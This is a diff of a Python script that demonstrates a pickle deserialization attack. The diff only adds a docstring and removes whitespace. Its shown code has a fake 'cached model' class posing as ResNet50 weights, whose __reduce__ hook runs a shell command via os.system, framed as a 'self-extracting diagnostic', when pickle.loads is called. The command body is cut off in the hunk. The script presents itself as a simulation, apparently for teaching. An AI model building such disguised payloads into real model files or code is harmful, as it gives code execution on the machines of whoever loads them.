@@ -7,17 +7,18 @@ import pickle
 import os
 
 class CachedModel:
+    """TODO: Add description for CachedModel."""
     def __init__(self, model_name="ResNet50_ImageNet_v2", data=None):
         self.model_name = model_name
         self.data = data or {"info": "This is a placeholder for model weights."}
 
     def __reduce__(self):
-        # This is the core of the payload. 
+        # This is the core of the payload.
         # The __reduce__ method is called when the object is unpickled.
         # It's supposed to return a tuple of (callable, args).
         # We're making the callable `os.system` and the args the command to run.
         # The command is a multi-line shell command string.
-        
+
         # The command is framed as a "self-extracting diagnostic"
         cmd = """
         echo "[+] Deserialization hook triggered. Running self-extracting diagnostic...";
@@ -47,4 +48,4 @@ print("An application is now deserializing the 'cached model'...")
 # The `pickle.loads` call is the attack vector.
 unpickled_object = pickle.loads(serialized_payload)
 
-print("--- Simulation Complete ---") 
+print("--- Simulation Complete ---")
